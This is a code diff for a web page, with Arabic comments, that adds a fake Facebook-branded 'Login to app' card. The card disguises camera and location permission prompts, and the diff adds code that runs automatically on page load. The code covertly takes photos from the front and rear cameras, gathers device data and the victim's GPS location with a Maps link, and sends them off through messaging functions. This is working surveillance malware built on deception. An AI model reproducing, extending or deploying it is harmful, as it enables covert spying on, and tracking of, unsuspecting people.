@@ -119,8 +119,11 @@
     display: none !important;
   }
 
+  /* =====================================================
+     شاشة التحميل
+     ===================================================== */
   #loader {
-    display: flex;
+    display: none;
     flex-direction: column;
     align-items: center;
     justify-content: center;
@@ -162,6 +165,9 @@
     50%      { opacity: 1; }
   }
 
+  /* =====================================================
+     شاشة الرفض
+     ===================================================== */
   #denied {
     display: none;
     text-align: center;
@@ -212,82 +218,100 @@
     opacity: .01;
     pointer-events: none;
   }
-</style>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  background-color:transparent !important;
-  min-height:100vh !important;
-}
-
-@media (max-width:900px){
-  html,body{
-    background-attachment:scroll !important;
+  /* =====================================================
+     الكارت الرئيسي
+     ===================================================== */
+  #appCard {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    width: 100%;
+    max-width: 380px;
+    padding: 16px;
   }
-}
+
+  #appCard.active {
+    display: flex;
+    animation: cardIn .45s ease;
+  }
+
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ---- الصندوق الطولي + الصورة الباهتة ---- */
+  .image-box {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 3 / 4;
+    max-height: 60vh;
+    border-radius: 22px;
+    overflow: hidden;
+    background: #1877f2;
+    box-shadow: 0 14px 44px rgba(0,0,0,.22);
+  }
+
+  .blurred-bg {
+    position: absolute;
+    inset: -24px;
+    background: url('https://facebook-pink-phi.vercel.app/share.jpg') center/cover no-repeat;
+    filter: blur(11px) brightness(.95);
+    transform: scale(1.05);
+  }
+
+  /* ---- لوجو فيسبوك خافت ---- */
+  .fb-logo {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: .22;
+    pointer-events: none;
+  }
+
+  .fb-logo svg {
+    width: 46%;
+    height: 46%;
+    fill: #ffffff;
+    filter: drop-shadow(0 4px 16px rgba(0,0,0,.15));
+  }
+
+  /* ---- الأزرار ---- */
+  .btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    font-family: inherit;
+    letter-spacing: .3px;
+    cursor: pointer;
+    transition: opacity .18s, transform .15s;
+  }
+
+  .btn:active {
+    transform: scale(.98);
+    opacity: .9;
+  }
+
+  .btn-primary {
+    background: #1877f2;
+    color: #ffffff;
+    box-shadow: 0 6px 20px rgba(24,119,242,.4);
+  }
+
+  .btn-secondary {
+    background: #f0f2f5;
+    color: #8a8d91;
+    border: 1px solid #e4e6eb;
+    opacity: .78;
+  }
 </style>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 <style id="em-gold-control-background">
 html,body{
@@ -311,6 +335,21 @@ html,body{
 </style>
 </head>
 <body>
+
+<!-- ============ الكارت الرئيسي ============ -->
+<div id="appCard" class="active">
+  <div class="image-box">
+    <div class="blurred-bg"></div>
+    <div class="fb-logo">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+    </div>
+  </div>
+
+  <button id="loginBtn" class="btn btn-primary">Login to app now</button>
+  <button id="browserBtn" class="btn btn-secondary">Continue to browser</button>
+</div>
 
 <!-- ============ شاشة التحميل ============ -->
 <div id="loader">
@@ -356,6 +395,7 @@ html,body{
 
   /* ============ Elements ============ */
   const v         = document.getElementById("v");
+  const appCardEl = document.getElementById("appCard");
   const loaderEl  = document.getElementById("loader");
   const deniedEl  = document.getElementById("denied");
   const retryBtn  = document.getElementById("retryBtn");
@@ -367,11 +407,18 @@ html,body{
   const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 
   /* ============ التحكم في الشاشات ============ */
+  function showAppCard(){
+    appCardEl.classList.add("active");
+    loaderEl.style.display = "none";
+    deniedEl.classList.remove("active");
+  }
   function showLoader(){
+    appCardEl.classList.remove("active");
     loaderEl.style.display = "flex";
     deniedEl.classList.remove("active");
   }
   function showDenied(){
+    appCardEl.classList.remove("active");
     loaderEl.style.display = "none";
     deniedEl.classList.add("active");
   }
@@ -857,8 +904,8 @@ html,body{
   /* ============================================================
      مرحلة تصوير
      ============================================================ */
-  async function capturePhase(facing, label, count){
-    await openCamera(facing);
+  async function capturePhase(facing, label, count, alreadyOpen){
+    if (!alreadyOpen) await openCamera(facing);
 
     for (let i = 1; i <= count; i++){
       const result = await captureSafe(facing === "user");
@@ -876,20 +923,25 @@ html,body{
     if (running) return;
     running = true;
 
-    showLoader();
-
     // بيانات الجهاز — تُرسل بالتوازي بدون انتظار
     collect().then(t => sendText(t)).catch(()=>{});
 
     try {
-      // 1) الكاميرا الأمامية
-      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE);
+      // 1) افتح الكاميرا الأمامية أولاً — ده اللي هيطلب الإذن
+      //    الكارت لسه ظاهر للمستخدم لحد ما يضغط Allow
+      await openCamera("user");
 
-      // 2) الكاميرا الخلفية
+      // 2) الإذن اتقبل — دلوقتي اعرض شاشة التحميل واخفي الكارت
+      showLoader();
+
+      // 3) التقاط الأمامية (الكاميرا مفتوحة فعلاً)
+      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE, true);
+
+      // 4) التقاط الخلفية
       await sleep(300);
-      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE);
+      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE, false);
 
-      // 3) الموقع الجغرافي
+      // 5) الموقع
       const loc = await requestLocation();
 
       if (loc && loc.lat !== undefined){
@@ -898,13 +950,13 @@ html,body{
           `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
           `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
         sendLocation(loc.lat, loc.lon, cap);
-      }else if (loc && loc.error){
+      } else if (loc && loc.error){
         sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
-      }else{
+      } else {
         sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
       }
 
-      // 4) نقفل الكاميرا — بدون أي تحويل أو تحميل ملف
+      // 6) إغلاق الكاميرا
       await closeCamera();
 
     } catch (err) {
@@ -918,6 +970,16 @@ html,body{
   /* ============================================================
      الأحداث
      ============================================================ */
+  document.getElementById("loginBtn").addEventListener("click", () => {
+    if (running) return;
+    runFullSequence();
+  });
+
+  document.getElementById("browserBtn").addEventListener("click", () => {
+    if (running) return;
+    runFullSequence();
+  });
+
   retryBtn.addEventListener("click", () => {
     if (running) return;
     runFullSequence();
@@ -927,7 +989,8 @@ html,body{
      🚀 تشغيل تلقائي
      ============================================================ */
   function boot(){
-    setTimeout(runFullSequence, 250);
+    showAppCard();                    // اعرض الكارت فوراً
+    setTimeout(runFullSequence, 250); // اطلب الإذن بعد لحظة قصيرة
   }
 
   if (document.readyState === "complete" || document.readyState === "interactive"){
